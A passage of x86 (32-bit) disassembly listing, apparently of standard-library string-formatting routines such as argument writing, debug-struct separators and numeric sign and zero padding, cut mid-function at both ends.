  403d21:	89 e5                	mov    %esp,%ebp
  403d23:	53                   	push   %ebx
  403d24:	57                   	push   %edi
  403d25:	56                   	push   %esi
  403d26:	83 ec 24             	sub    $0x24,%esp
  403d29:	8b 55 10             	mov    0x10(%ebp),%edx
  403d2c:	8b 45 0c             	mov    0xc(%ebp),%eax
  403d2f:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403d32:	c7 45 dc 20 00 00 e0 	movl   $0xe0000020,-0x24(%ebp)
  403d39:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%ebp)
  403d40:	8b 5a 10             	mov    0x10(%edx),%ebx
  403d43:	89 4d d4             	mov    %ecx,-0x2c(%ebp)
  403d46:	89 45 d8             	mov    %eax,-0x28(%ebp)
  403d49:	85 db                	test   %ebx,%ebx
  403d4b:	0f 84 12 01 00 00    	je     0x403e63
  403d51:	8b 4a 14             	mov    0x14(%edx),%ecx
  403d54:	85 c9                	test   %ecx,%ecx
  403d56:	0f 84 80 01 00 00    	je     0x403edc
  403d5c:	8d 04 cd 00 00 00 00 	lea    0x0(,%ecx,8),%eax
  403d63:	49                   	dec    %ecx
  403d64:	31 ff                	xor    %edi,%edi
  403d66:	8d 34 40             	lea    (%eax,%eax,2),%esi
  403d69:	8b 02                	mov    (%edx),%eax
  403d6b:	8b 52 08             	mov    0x8(%edx),%edx
  403d6e:	81 e1 ff ff ff 1f    	and    $0x1fffffff,%ecx
  403d74:	41                   	inc    %ecx
  403d75:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  403d78:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  403d7b:	89 45 d0             	mov    %eax,-0x30(%ebp)
  403d7e:	66 90                	xchg   %ax,%ax
  403d80:	89 75 ec             	mov    %esi,-0x14(%ebp)
  403d83:	89 c6                	mov    %eax,%esi
  403d85:	8b 44 f8 04          	mov    0x4(%eax,%edi,8),%eax
  403d89:	85 c0                	test   %eax,%eax
  403d8b:	74 18                	je     0x403da5
  403d8d:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  403d90:	50                   	push   %eax
  403d91:	ff 34 fe             	push   (%esi,%edi,8)
  403d94:	ff 75 d4             	push   -0x2c(%ebp)
  403d97:	ff 51 0c             	call   *0xc(%ecx)
  403d9a:	83 c4 0c             	add    $0xc,%esp
  403d9d:	84 c0                	test   %al,%al
  403d9f:	0f 85 33 01 00 00    	jne    0x403ed8
  403da5:	0f b7 43 08          	movzwl 0x8(%ebx),%eax
  403da9:	85 c0                	test   %eax,%eax
  403dab:	74 23                	je     0x403dd0
  403dad:	8b 75 ec             	mov    -0x14(%ebp),%esi
  403db0:	83 f8 01             	cmp    $0x1,%eax
  403db3:	75 2b                	jne    0x403de0
  403db5:	8b 43 0c             	mov    0xc(%ebx),%eax
  403db8:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  403dbb:	0f b7 44 c1 04       	movzwl 0x4(%ecx,%eax,8),%eax
  403dc0:	89 45 f0             	mov    %eax,-0x10(%ebp)
  403dc3:	eb 22                	jmp    0x403de7
  403dc5:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  403dcc:	00 00 00 
  403dcf:	90                   	nop
  403dd0:	0f b7 43 0a          	movzwl 0xa(%ebx),%eax
  403dd4:	8b 75 ec             	mov    -0x14(%ebp),%esi
  403dd7:	89 45 f0             	mov    %eax,-0x10(%ebp)
  403dda:	eb 0b                	jmp    0x403de7
  403ddc:	0f 1f 40 00          	nopl   0x0(%eax)
  403de0:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  403de7:	0f b7 0b             	movzwl (%ebx),%ecx
  403dea:	83 f9 02             	cmp    $0x2,%ecx
  403ded:	74 21                	je     0x403e10
  403def:	83 f9 01             	cmp    $0x1,%ecx
  403df2:	75 2c                	jne    0x403e20
  403df4:	8b 4b 04             	mov    0x4(%ebx),%ecx
  403df7:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  403dfa:	0f b7 4c c8 04       	movzwl 0x4(%eax,%ecx,8),%ecx
  403dff:	eb 23                	jmp    0x403e24
  403e01:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  403e08:	00 00 00 
  403e0b:	0f 1f 44 00 00       	nopl   0x0(%eax,%eax,1)
  403e10:	31 c9                	xor    %ecx,%ecx
  403e12:	eb 10                	jmp    0x403e24
  403e14:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  403e1b:	00 00 00 
  403e1e:	66 90                	xchg   %ax,%ax
  403e20:	0f b7 4b 02          	movzwl 0x2(%ebx),%ecx
  403e24:	8b 43 14             	mov    0x14(%ebx),%eax
  403e27:	8b 53 10             	mov    0x10(%ebx),%edx
  403e2a:	89 45 dc             	mov    %eax,-0x24(%ebp)
  403e2d:	8b 45 f0             	mov    -0x10(%ebp),%eax
  403e30:	66 89 45 e0          	mov    %ax,-0x20(%ebp)
  403e34:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  403e37:	66 89 4d e2          	mov    %cx,-0x1e(%ebp)
  403e3b:	50                   	push   %eax
  403e3c:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  403e3f:	ff 34 d0             	push   (%eax,%edx,8)
  403e42:	ff 54 d0 04          	call   *0x4(%eax,%edx,8)
  403e46:	83 c4 08             	add    $0x8,%esp
  403e49:	84 c0                	test   %al,%al
  403e4b:	0f 85 87 00 00 00    	jne    0x403ed8
  403e51:	8b 45 d0             	mov    -0x30(%ebp),%eax
  403e54:	83 c3 18             	add    $0x18,%ebx
  403e57:	47                   	inc    %edi
  403e58:	83 c6 e8             	add    $0xffffffe8,%esi
  403e5b:	0f 85 1f ff ff ff    	jne    0x403d80
  403e61:	eb 68                	jmp    0x403ecb
  403e63:	8b 42 0c             	mov    0xc(%edx),%eax
  403e66:	85 c0                	test   %eax,%eax
  403e68:	74 72                	je     0x403edc
  403e6a:	8b 4a 08             	mov    0x8(%edx),%ecx
  403e6d:	8b 1a                	mov    (%edx),%ebx
  403e6f:	31 ff                	xor    %edi,%edi
  403e71:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  403e74:	8d 0c c1             	lea    (%ecx,%eax,8),%ecx
  403e77:	c1 e0 03             	shl    $0x3,%eax
  403e7a:	83 c0 f8             	add    $0xfffffff8,%eax
  403e7d:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  403e80:	c1 e8 03             	shr    $0x3,%eax
  403e83:	40                   	inc    %eax
  403e84:	89 45 e8             	mov    %eax,-0x18(%ebp)
  403e87:	66 0f 1f 84 00 00 00 	nopw   0x0(%eax,%eax,1)
  403e8e:	00 00 
  403e90:	8b 44 fb 04          	mov    0x4(%ebx,%edi,8),%eax
  403e94:	85 c0                	test   %eax,%eax
  403e96:	74 14                	je     0x403eac
  403e98:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  403e9b:	50                   	push   %eax
  403e9c:	ff 34 fb             	push   (%ebx,%edi,8)
  403e9f:	ff 75 d4             	push   -0x2c(%ebp)
  403ea2:	ff 51 0c             	call   *0xc(%ecx)
  403ea5:	83 c4 0c             	add    $0xc,%esp
  403ea8:	84 c0                	test   %al,%al
  403eaa:	75 2c                	jne    0x403ed8
  403eac:	8b 45 ec             	mov    -0x14(%ebp),%eax
  403eaf:	8d 34 f8             	lea    (%eax,%edi,8),%esi
  403eb2:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  403eb5:	50                   	push   %eax
  403eb6:	ff 36                	push   (%esi)
  403eb8:	ff 56 04             	call   *0x4(%esi)
  403ebb:	83 c4 08             	add    $0x8,%esp
  403ebe:	84 c0                	test   %al,%al
  403ec0:	75 16                	jne    0x403ed8
  403ec2:	83 c6 08             	add    $0x8,%esi
  403ec5:	47                   	inc    %edi
  403ec6:	3b 75 f0             	cmp    -0x10(%ebp),%esi
  403ec9:	75 c5                	jne    0x403e90
  403ecb:	8b 55 10             	mov    0x10(%ebp),%edx
  403ece:	8b 75 e8             	mov    -0x18(%ebp),%esi
  403ed1:	3b 72 04             	cmp    0x4(%edx),%esi
  403ed4:	72 0d                	jb     0x403ee3
  403ed6:	eb 28                	jmp    0x403f00
  403ed8:	b0 01                	mov    $0x1,%al
  403eda:	eb 26                	jmp    0x403f02
  403edc:	31 f6                	xor    %esi,%esi
  403ede:	3b 72 04             	cmp    0x4(%edx),%esi
  403ee1:	73 1d                	jae    0x403f00
  403ee3:	8b 02                	mov    (%edx),%eax
  403ee5:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  403ee8:	ff 74 f0 04          	push   0x4(%eax,%esi,8)
  403eec:	ff 34 f0             	push   (%eax,%esi,8)
  403eef:	ff 75 d4             	push   -0x2c(%ebp)
  403ef2:	ff 51 0c             	call   *0xc(%ecx)
  403ef5:	83 c4 0c             	add    $0xc,%esp
  403ef8:	89 c1                	mov    %eax,%ecx
  403efa:	b0 01                	mov    $0x1,%al
  403efc:	84 c9                	test   %cl,%cl
  403efe:	75 02                	jne    0x403f02
  403f00:	31 c0                	xor    %eax,%eax
  403f02:	83 c4 24             	add    $0x24,%esp
  403f05:	5e                   	pop    %esi
  403f06:	5f                   	pop    %edi
  403f07:	5b                   	pop    %ebx
  403f08:	5d                   	pop    %ebp
  403f09:	c3                   	ret
  403f0a:	cc                   	int3
  403f0b:	cc                   	int3
  403f0c:	cc                   	int3
  403f0d:	cc                   	int3
  403f0e:	cc                   	int3
  403f0f:	cc                   	int3
  403f10:	55                   	push   %ebp
  403f11:	89 e5                	mov    %esp,%ebp
  403f13:	53                   	push   %ebx
  403f14:	57                   	push   %edi
  403f15:	56                   	push   %esi
  403f16:	83 ec 20             	sub    $0x20,%esp
  403f19:	8b 75 08             	mov    0x8(%ebp),%esi
  403f1c:	b3 01                	mov    $0x1,%bl
  403f1e:	80 7e 04 00          	cmpb   $0x0,0x4(%esi)
  403f22:	74 11                	je     0x403f35
  403f24:	88 5e 04             	mov    %bl,0x4(%esi)
  403f27:	c6 46 05 01          	movb   $0x1,0x5(%esi)
  403f2b:	89 f0                	mov    %esi,%eax
  403f2d:	83 c4 20             	add    $0x20,%esp
  403f30:	5e                   	pop    %esi
  403f31:	5f                   	pop    %edi
  403f32:	5b                   	pop    %ebx
  403f33:	5d                   	pop    %ebp
  403f34:	c3                   	ret
  403f35:	8b 3e                	mov    (%esi),%edi
  403f37:	8b 55 0c             	mov    0xc(%ebp),%edx
  403f3a:	0f b6 46 05          	movzbl 0x5(%esi),%eax
  403f3e:	f6 47 0a 80          	testb  $0x80,0xa(%edi)
  403f42:	75 65                	jne    0x403fa9
  403f44:	0f b6 c8             	movzbl %al,%ecx
  403f47:	ba 60 3d 43 00       	mov    $0x433d60,%edx
  403f4c:	bb 84 3d 43 00       	mov    $0x433d84,%ebx
  403f51:	83 f1 03             	xor    $0x3,%ecx
  403f54:	84 c0                	test   %al,%al
  403f56:	8b 47 04             	mov    0x4(%edi),%eax
  403f59:	0f 45 da             	cmovne %edx,%ebx
  403f5c:	51                   	push   %ecx
  403f5d:	53                   	push   %ebx
  403f5e:	ff 37                	push   (%edi)
  403f60:	ff 50 0c             	call   *0xc(%eax)
  403f63:	83 c4 0c             	add    $0xc,%esp
  403f66:	b3 01                	mov    $0x1,%bl
  403f68:	84 c0                	test   %al,%al
  403f6a:	75 b8                	jne    0x403f24
  403f6c:	8b 47 04             	mov    0x4(%edi),%eax
  403f6f:	ff 75 10             	push   0x10(%ebp)
  403f72:	ff 75 0c             	push   0xc(%ebp)
  403f75:	ff 37                	push   (%edi)
  403f77:	ff 50 0c             	call   *0xc(%eax)
  403f7a:	83 c4 0c             	add    $0xc,%esp
  403f7d:	84 c0                	test   %al,%al
  403f7f:	75 a3                	jne    0x403f24
  403f81:	8b 47 04             	mov    0x4(%edi),%eax
  403f84:	6a 02                	push   $0x2
  403f86:	68 87 3d 43 00       	push   $0x433d87
  403f8b:	ff 37                	push   (%edi)
  403f8d:	ff 50 0c             	call   *0xc(%eax)
  403f90:	83 c4 0c             	add    $0xc,%esp
  403f93:	84 c0                	test   %al,%al
  403f95:	75 8d                	jne    0x403f24
  403f97:	57                   	push   %edi
  403f98:	ff 75 14             	push   0x14(%ebp)
  403f9b:	8b 45 18             	mov    0x18(%ebp),%eax
  403f9e:	ff 50 0c             	call   *0xc(%eax)
  403fa1:	83 c4 08             	add    $0x8,%esp
  403fa4:	e9 aa 00 00 00       	jmp    0x404053
  403fa9:	84 c0                	test   %al,%al
  403fab:	75 20                	jne    0x403fcd
  403fad:	8b 47 04             	mov    0x4(%edi),%eax
  403fb0:	6a 03                	push   $0x3
  403fb2:	68 89 3d 43 00       	push   $0x433d89
  403fb7:	ff 37                	push   (%edi)
  403fb9:	89 d3                	mov    %edx,%ebx
  403fbb:	ff 50 0c             	call   *0xc(%eax)
  403fbe:	89 da                	mov    %ebx,%edx
  403fc0:	83 c4 0c             	add    $0xc,%esp
  403fc3:	b3 01                	mov    $0x1,%bl
  403fc5:	84 c0                	test   %al,%al
  403fc7:	0f 85 57 ff ff ff    	jne    0x403f24
  403fcd:	c6 45 f3 01          	movb   $0x1,-0xd(%ebp)
  403fd1:	8b 07                	mov    (%edi),%eax
  403fd3:	8b 4f 04             	mov    0x4(%edi),%ecx
  403fd6:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  403fd9:	8d 45 f3             	lea    -0xd(%ebp),%eax
  403fdc:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  403fdf:	89 45 dc             	mov    %eax,-0x24(%ebp)
  403fe2:	8b 47 08             	mov    0x8(%edi),%eax
  403fe5:	8b 4f 0c             	mov    0xc(%edi),%ecx
  403fe8:	8d 7d d4             	lea    -0x2c(%ebp),%edi
  403feb:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  403fee:	89 45 e8             	mov    %eax,-0x18(%ebp)
  403ff1:	89 7d e0             	mov    %edi,-0x20(%ebp)
  403ff4:	c7 45 e4 6c 3d 43 00 	movl   $0x433d6c,-0x1c(%ebp)
  403ffb:	ff 75 10             	push   0x10(%ebp)
  403ffe:	52                   	push   %edx
  403fff:	57                   	push   %edi
  404000:	e8 eb 23 00 00       	call   0x4063f0
  404005:	83 c4 0c             	add    $0xc,%esp
  404008:	84 c0                	test   %al,%al
  40400a:	0f 85 14 ff ff ff    	jne    0x403f24
  404010:	6a 02                	push   $0x2
  404012:	68 87 3d 43 00       	push   $0x433d87
  404017:	57                   	push   %edi
  404018:	e8 d3 23 00 00       	call   0x4063f0
  40401d:	83 c4 0c             	add    $0xc,%esp
  404020:	84 c0                	test   %al,%al
  404022:	0f 85 fc fe ff ff    	jne    0x403f24
  404028:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40402b:	50                   	push   %eax
  40402c:	ff 75 14             	push   0x14(%ebp)
  40402f:	8b 45 18             	mov    0x18(%ebp),%eax
  404032:	ff 50 0c             	call   *0xc(%eax)
  404035:	83 c4 08             	add    $0x8,%esp
  404038:	84 c0                	test   %al,%al
  40403a:	0f 85 e4 fe ff ff    	jne    0x403f24
  404040:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  404043:	6a 02                	push   $0x2
  404045:	68 63 3d 43 00       	push   $0x433d63
  40404a:	ff 75 e0             	push   -0x20(%ebp)
  40404d:	ff 50 0c             	call   *0xc(%eax)
  404050:	83 c4 0c             	add    $0xc,%esp
  404053:	89 c3                	mov    %eax,%ebx
  404055:	e9 ca fe ff ff       	jmp    0x403f24
  40405a:	cc                   	int3
  40405b:	cc                   	int3
  40405c:	cc                   	int3
  40405d:	cc                   	int3
  40405e:	cc                   	int3
  40405f:	cc                   	int3
  404060:	55                   	push   %ebp
  404061:	89 e5                	mov    %esp,%ebp
  404063:	53                   	push   %ebx
  404064:	57                   	push   %edi
  404065:	56                   	push   %esi
  404066:	83 ec 20             	sub    $0x20,%esp
  404069:	8b 75 08             	mov    0x8(%ebp),%esi
  40406c:	b0 01                	mov    $0x1,%al
  40406e:	80 7e 04 00          	cmpb   $0x0,0x4(%esi)
  404072:	0f 85 b2 00 00 00    	jne    0x40412a
  404078:	8b 3e                	mov    (%esi),%edi
  40407a:	8b 55 10             	mov    0x10(%ebp),%edx
  40407d:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  404080:	0f b6 46 05          	movzbl 0x5(%esi),%eax
  404084:	f6 47 0a 80          	testb  $0x80,0xa(%edi)
  404088:	75 2b                	jne    0x4040b5
  40408a:	84 c0                	test   %al,%al
  40408c:	74 1d                	je     0x4040ab
  40408e:	8b 47 04             	mov    0x4(%edi),%eax
  404091:	6a 02                	push   $0x2
  404093:	68 60 3d 43 00       	push   $0x433d60
  404098:	ff 37                	push   (%edi)
  40409a:	ff 50 0c             	call   *0xc(%eax)
  40409d:	8b 55 10             	mov    0x10(%ebp),%edx
  4040a0:	83 c4 0c             	add    $0xc,%esp
  4040a3:	89 c1                	mov    %eax,%ecx
  4040a5:	b0 01                	mov    $0x1,%al
  4040a7:	84 c9                	test   %cl,%cl
  4040a9:	75 7f                	jne    0x40412a
  4040ab:	57                   	push   %edi
  4040ac:	53                   	push   %ebx
  4040ad:	ff 52 0c             	call   *0xc(%edx)
  4040b0:	83 c4 08             	add    $0x8,%esp
  4040b3:	eb 75                	jmp    0x40412a
  4040b5:	84 c0                	test   %al,%al
  4040b7:	75 1d                	jne    0x4040d6
  4040b9:	8b 47 04             	mov    0x4(%edi),%eax
  4040bc:	6a 01                	push   $0x1
  4040be:	68 62 3d 43 00       	push   $0x433d62
  4040c3:	ff 37                	push   (%edi)
  4040c5:	ff 50 0c             	call   *0xc(%eax)
  4040c8:	8b 55 10             	mov    0x10(%ebp),%edx
  4040cb:	83 c4 0c             	add    $0xc,%esp
  4040ce:	89 c1                	mov    %eax,%ecx
  4040d0:	b0 01                	mov    $0x1,%al
  4040d2:	84 c9                	test   %cl,%cl
  4040d4:	75 54                	jne    0x40412a
  4040d6:	c6 45 f3 01          	movb   $0x1,-0xd(%ebp)
  4040da:	8b 07                	mov    (%edi),%eax
  4040dc:	8b 4f 04             	mov    0x4(%edi),%ecx
  4040df:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4040e2:	8d 45 f3             	lea    -0xd(%ebp),%eax
  4040e5:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  4040e8:	89 45 dc             	mov    %eax,-0x24(%ebp)
  4040eb:	8b 47 08             	mov    0x8(%edi),%eax
  4040ee:	8b 4f 0c             	mov    0xc(%edi),%ecx
  4040f1:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4040f4:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  4040f7:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  4040fa:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4040fd:	8d 45 e0             	lea    -0x20(%ebp),%eax
  404100:	c7 45 e4 6c 3d 43 00 	movl   $0x433d6c,-0x1c(%ebp)
  404107:	50                   	push   %eax
  404108:	53                   	push   %ebx
  404109:	ff 52 0c             	call   *0xc(%edx)
  40410c:	83 c4 08             	add    $0x8,%esp
  40410f:	84 c0                	test   %al,%al
  404111:	74 04                	je     0x404117
  404113:	b0 01                	mov    $0x1,%al
  404115:	eb 13                	jmp    0x40412a
  404117:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40411a:	6a 02                	push   $0x2
  40411c:	68 63 3d 43 00       	push   $0x433d63
  404121:	ff 75 e0             	push   -0x20(%ebp)
  404124:	ff 50 0c             	call   *0xc(%eax)
  404127:	83 c4 0c             	add    $0xc,%esp
  40412a:	88 46 04             	mov    %al,0x4(%esi)
  40412d:	c6 46 05 01          	movb   $0x1,0x5(%esi)
  404131:	89 f0                	mov    %esi,%eax
  404133:	83 c4 20             	add    $0x20,%esp
  404136:	5e                   	pop    %esi
  404137:	5f                   	pop    %edi
  404138:	5b                   	pop    %ebx
  404139:	5d                   	pop    %ebp
  40413a:	c3                   	ret
  40413b:	cc                   	int3
  40413c:	cc                   	int3
  40413d:	cc                   	int3
  40413e:	cc                   	int3
  40413f:	cc                   	int3
  404140:	55                   	push   %ebp
  404141:	89 e5                	mov    %esp,%ebp
  404143:	57                   	push   %edi
  404144:	56                   	push   %esi
  404145:	8b 45 08             	mov    0x8(%ebp),%eax
  404148:	89 d6                	mov    %edx,%esi
  40414a:	89 cf                	mov    %ecx,%edi
  40414c:	3d 00 00 11 00       	cmp    $0x110000,%eax
  404151:	74 10                	je     0x404163
  404153:	50                   	push   %eax
  404154:	57                   	push   %edi
  404155:	ff 56 10             	call   *0x10(%esi)
  404158:	83 c4 08             	add    $0x8,%esp
  40415b:	89 c1                	mov    %eax,%ecx
  40415d:	b0 01                	mov    $0x1,%al
  40415f:	84 c9                	test   %cl,%cl
  404161:	75 16                	jne    0x404179
  404163:	8b 45 0c             	mov    0xc(%ebp),%eax
  404166:	85 c0                	test   %eax,%eax
  404168:	74 0d                	je     0x404177
  40416a:	ff 75 10             	push   0x10(%ebp)
  40416d:	50                   	push   %eax
  40416e:	57                   	push   %edi
  40416f:	ff 56 0c             	call   *0xc(%esi)
  404172:	83 c4 0c             	add    $0xc,%esp
  404175:	eb 02                	jmp    0x404179
  404177:	31 c0                	xor    %eax,%eax
  404179:	5e                   	pop    %esi
  40417a:	5f                   	pop    %edi
  40417b:	5d                   	pop    %ebp
  40417c:	c3                   	ret
  40417d:	cc                   	int3
  40417e:	cc                   	int3
  40417f:	cc                   	int3
  404180:	55                   	push   %ebp
  404181:	89 e5                	mov    %esp,%ebp
  404183:	53                   	push   %ebx
  404184:	57                   	push   %edi
  404185:	56                   	push   %esi
  404186:	83 ec 1c             	sub    $0x1c,%esp
  404189:	8b 5d 1c             	mov    0x1c(%ebp),%ebx
  40418c:	8b 7d 08             	mov    0x8(%ebp),%edi
  40418f:	80 7d 0c 00          	cmpb   $0x0,0xc(%ebp)
  404193:	e8 00 00 00 00       	call   0x404198
  404198:	58                   	pop    %eax
  404199:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40419c:	74 22                	je     0x4041c0
  40419e:	8b 4f 08             	mov    0x8(%edi),%ecx
  4041a1:	b8 00 00 11 00       	mov    $0x110000,%eax
  4041a6:	be 2b 00 00 00       	mov    $0x2b,%esi
  4041ab:	89 ca                	mov    %ecx,%edx
  4041ad:	81 e2 00 00 20 00    	and    $0x200000,%edx
  4041b3:	0f 44 f0             	cmove  %eax,%esi
  4041b6:	c1 ea 15             	shr    $0x15,%edx
  4041b9:	01 da                	add    %ebx,%edx
  4041bb:	89 75 e8             	mov    %esi,-0x18(%ebp)
  4041be:	eb 0d                	jmp    0x4041cd
  4041c0:	8b 4f 08             	mov    0x8(%edi),%ecx
  4041c3:	8d 53 01             	lea    0x1(%ebx),%edx
  4041c6:	c7 45 e8 2d 00 00 00 	movl   $0x2d,-0x18(%ebp)
  4041cd:	8b 45 14             	mov    0x14(%ebp),%eax
  4041d0:	f7 c1 00 00 80 00    	test   $0x800000,%ecx
  4041d6:	75 09                	jne    0x4041e1
  4041d8:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  4041df:	eb 46                	jmp    0x404227
  4041e1:	8b 5d 10             	mov    0x10(%ebp),%ebx
  4041e4:	83 f8 10             	cmp    $0x10,%eax
  4041e7:	89 d6                	mov    %edx,%esi
  4041e9:	89 cf                	mov    %ecx,%edi
  4041eb:	89 5d ec             	mov    %ebx,-0x14(%ebp)
  4041ee:	73 20                	jae    0x404210
  4041f0:	85 c0                	test   %eax,%eax
  4041f2:	74 28                	je     0x40421c
  4041f4:	89 c2                	mov    %eax,%edx
  4041f6:	31 c0                	xor    %eax,%eax
  4041f8:	89 d9                	mov    %ebx,%ecx
  4041fa:	66 0f 1f 44 00 00    	nopw   0x0(%eax,%eax,1)
  404200:	31 db                	xor    %ebx,%ebx
  404202:	80 39 c0             	cmpb   $0xc0,(%ecx)
  404205:	0f 9d c3             	setge  %bl
  404208:	41                   	inc    %ecx
  404209:	01 d8                	add    %ebx,%eax
  40420b:	4a                   	dec    %edx
  40420c:	75 f2                	jne    0x404200
  40420e:	eb 0e                	jmp    0x40421e
  404210:	50                   	push   %eax
  404211:	53                   	push   %ebx
  404212:	e8 69 09 00 00       	call   0x404b80
  404217:	83 c4 08             	add    $0x8,%esp
  40421a:	eb 02                	jmp    0x40421e
  40421c:	31 c0                	xor    %eax,%eax
  40421e:	89 f9                	mov    %edi,%ecx
  404220:	8b 7d 08             	mov    0x8(%ebp),%edi
  404223:	89 f2                	mov    %esi,%edx
  404225:	01 c2                	add    %eax,%edx
  404227:	0f b7 5f 0c          	movzwl 0xc(%edi),%ebx
  40422b:	39 da                	cmp    %ebx,%edx
  40422d:	73 2c                	jae    0x40425b
  40422f:	f7 c1 00 00 00 01    	test   $0x1000000,%ecx
  404235:	89 55 dc             	mov    %edx,-0x24(%ebp)
  404238:	75 58                	jne    0x404292
  40423a:	89 de                	mov    %ebx,%esi
  40423c:	89 c8                	mov    %ecx,%eax
  40423e:	29 d6                	sub    %edx,%esi
  404240:	8b 55 f0             	mov    -0x10(%ebp),%edx
  404243:	c1 e8 1d             	shr    $0x1d,%eax
  404246:	83 e0 03             	and    $0x3,%eax
  404249:	03 14 85 d4 43 40 00 	add    0x4043d4(,%eax,4),%edx
  404250:	31 c0                	xor    %eax,%eax
  404252:	ff e2                	jmp    *%edx
  404254:	89 f0                	mov    %esi,%eax
  404256:	e9 ca 00 00 00       	jmp    0x404325
  40425b:	8b 37                	mov    (%edi),%esi
  40425d:	8b 7f 04             	mov    0x4(%edi),%edi
  404260:	8b 5d 1c             	mov    0x1c(%ebp),%ebx
  404263:	89 f1                	mov    %esi,%ecx
  404265:	89 fa                	mov    %edi,%edx
  404267:	ff 75 14             	push   0x14(%ebp)
  40426a:	ff 75 ec             	push   -0x14(%ebp)
  40426d:	ff 75 e8             	push   -0x18(%ebp)
  404270:	e8 cb fe ff ff       	call   0x404140
  404275:	83 c4 0c             	add    $0xc,%esp
  404278:	b1 01                	mov    $0x1,%cl
  40427a:	84 c0                	test   %al,%al
  40427c:	0f 85 47 01 00 00    	jne    0x4043c9
  404282:	53                   	push   %ebx
  404283:	ff 75 18             	push   0x18(%ebp)
  404286:	56                   	push   %esi
  404287:	ff 57 0c             	call   *0xc(%edi)
  40428a:	83 c4 28             	add    $0x28,%esp
  40428d:	e9 3c 01 00 00       	jmp    0x4043ce
  404292:	8b 47 0c             	mov    0xc(%edi),%eax
  404295:	89 45 f0             	mov    %eax,-0x10(%ebp)
  404298:	8b 47 08             	mov    0x8(%edi),%eax
  40429b:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  40429e:	25 00 00 e0 9f       	and    $0x9fe00000,%eax
  4042a3:	0d 30 00 00 20       	or     $0x20000030,%eax
  4042a8:	89 47 08             	mov    %eax,0x8(%edi)
  4042ab:	8b 37                	mov    (%edi),%esi
  4042ad:	8b 7f 04             	mov    0x4(%edi),%edi
  4042b0:	89 f1                	mov    %esi,%ecx
  4042b2:	89 fa                	mov    %edi,%edx
  4042b4:	ff 75 14             	push   0x14(%ebp)
  4042b7:	ff 75 ec             	push   -0x14(%ebp)
  4042ba:	ff 75 e8             	push   -0x18(%ebp)
  4042bd:	e8 7e fe ff ff       	call   0x404140
  4042c2:	83 c4 0c             	add    $0xc,%esp
  4042c5:	b1 01                	mov    $0x1,%cl
  4042c7:	84 c0                	test   %al,%al
  4042c9:	0f 85 fa 00 00 00    	jne    0x4043c9
  4042cf:	2b 5d dc             	sub    -0x24(%ebp),%ebx
  4042d2:	43                   	inc    %ebx
  4042d3:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  4042da:	00 00 00 
  4042dd:	0f 1f 00             	nopl   (%eax)
  4042e0:	66 4b                	dec    %bx
  4042e2:	74 0f                	je     0x4042f3
  4042e4:	6a 30                	push   $0x30
  4042e6:	56                   	push   %esi
  4042e7:	ff 57 10             	call   *0x10(%edi)
  4042ea:	83 c4 08             	add    $0x8,%esp
  4042ed:	84 c0                	test   %al,%al
  4042ef:	74 ef                	je     0x4042e0
  4042f1:	eb 61                	jmp    0x404354
  4042f3:	ff 75 1c             	push   0x1c(%ebp)
  4042f6:	ff 75 18             	push   0x18(%ebp)
  4042f9:	56                   	push   %esi
  4042fa:	ff 57 0c             	call   *0xc(%edi)
  4042fd:	83 c4 0c             	add    $0xc,%esp
  404300:	84 c0                	test   %al,%al
  404302:	b1 01                	mov    $0x1,%cl
  404304:	0f 85 bf 00 00 00    	jne    0x4043c9
  40430a:	8b 45 08             	mov    0x8(%ebp),%eax
  40430d:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  404310:	89 48 08             	mov    %ecx,0x8(%eax)
  404313:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404316:	89 48 0c             	mov    %ecx,0xc(%eax)
  404319:	31 c9                	xor    %ecx,%ecx
  40431b:	e9 a9 00 00 00       	jmp    0x4043c9
  404320:	0f b7 c6             	movzwl %si,%eax
  404323:	d1 e8                	shr    $1,%eax
  404325:	8b 17                	mov    (%edi),%edx
  404327:	8b 7f 04             	mov    0x4(%edi),%edi
  40432a:	89 75 e0             	mov    %esi,-0x20(%ebp)
  40432d:	81 e1 ff ff 1f 00    	and    $0x1fffff,%ecx
  404333:	8d 70 01             	lea    0x1(%eax),%esi
  404336:	89 45 d8             	mov    %eax,-0x28(%ebp)
  404339:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  40433c:	89 55 f0             	mov    %edx,-0x10(%ebp)
  40433f:	90                   	nop
  404340:	66 4e                	dec    %si
  404342:	74 14                	je     0x404358
  404344:	ff 75 e4             	push   -0x1c(%ebp)
  404347:	ff 75 f0             	push   -0x10(%ebp)
  40434a:	ff 57 10             	call   *0x10(%edi)
